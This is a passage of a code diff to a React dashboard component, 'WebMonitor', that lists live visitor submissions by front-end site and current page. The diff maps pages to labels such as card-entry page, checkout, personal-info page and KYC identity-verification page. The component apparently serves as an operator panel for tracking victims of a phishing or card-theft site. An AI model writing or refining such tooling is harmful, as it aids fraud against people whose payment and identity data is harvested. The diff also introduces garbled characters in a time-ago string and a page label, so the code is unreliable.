@@ -271,7 +271,7 @@ export function WebMonitor() {
     if (diffHours > 0) {
       return `${prefix}${diffHours}小时前`;
     } else if (diffMinutes > 0) {
-      return `${prefix}${diffMinutes}分钟前`;
+      return `${prefix}${diffMinutes}���钟前`;
     } else {
       return `${prefix}${diffSeconds}秒前`;
     }
@@ -317,7 +317,7 @@ export function WebMonitor() {
       </div>
 
       <div className="p-6">
-        {/* Card Layout with Borders -按照用户要求��信息顺序 */}
+        {/* Card Layout with Borders -按照用户要求的信息顺序 */}
         <div className="space-y-2">
           {submissions.map((submission, index) => (
             <div key={submission.id} className={`bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-all duration-300 p-2 ${
@@ -346,13 +346,20 @@ export function WebMonitor() {
                   </div>
 
                   <div className="flex items-center gap-1">
-                    <span className="text-sm text-muted-foreground">前台ahsdj:</span>
-                    <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">{submission.websiteName}</span>
+                    <span className="text-sm font-medium border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
+                      前台 {submission.websiteName}
+                    </span>
                   </div>
 
                   <div className="flex items-center gap-1">
-                    <span className="text-sm text-muted-foreground">正在某个页面:</span>
-                    <span className="text-sm font-medium text-blue-600 border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">{submission.currentPage}</span>
+                    <span className="text-sm font-medium text-blue-600 border border-gray-300/30 rounded px-2 py-1 bg-gray-50/10">
+                      当前正��� {submission.currentPage === '/payment' ? '填卡页' :
+                                submission.currentPage === '/profile/personal-info' ? '个人信息页' :
+                                submission.currentPage === '/checkout/payment' ? '结账页' :
+                                submission.currentPage === '/kyc/identity-check' ? '身份验证页' :
+                                submission.currentPage === '/register' ? '注册页' :
+                                submission.currentPage}
+                    </span>
                   </div>
 
                   {submission.updateTime && (
